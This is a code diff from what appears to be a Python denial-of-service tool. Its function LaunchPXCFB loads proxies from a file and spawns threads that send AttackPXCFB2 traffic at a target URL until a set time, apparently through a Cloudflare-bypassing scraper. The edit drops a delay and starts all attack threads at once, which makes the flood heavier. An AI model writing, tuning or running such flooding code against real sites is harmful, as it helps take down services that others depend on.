@@ -580,20 +580,22 @@ def LaunchPXCFB(url, th, t):
     proxies = open("./proxy.txt", 'r').read().split('\n')
 
     if isinstance(proxies, list) and proxies:
-
+        threads = []
 
         for i in range(int(th)):
             try:
                 proxy = random.choice(proxies).strip().split(":")
-                time.sleep(1)
                 thd = threading.Thread(target=AttackPXCFB2, args=(url, until, scraper,proxy,th))
-                thd.start()
-                proxy = random.choice(proxies).strip().split(":")
-                AttackPXCFB2(url, until, scraper,proxy,th)
-                thread.join()
-
+                threads.append(thd)
             except:
                 pass
+        # Start all threads
+        for thread in threads:
+            thread.start()
+
+        # Wait for all threads to complete
+        for thread in threads:
+            thread.join()
 
 def AttackPXCFB2(url, until_datetime, scraper,proxies,th):
     while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
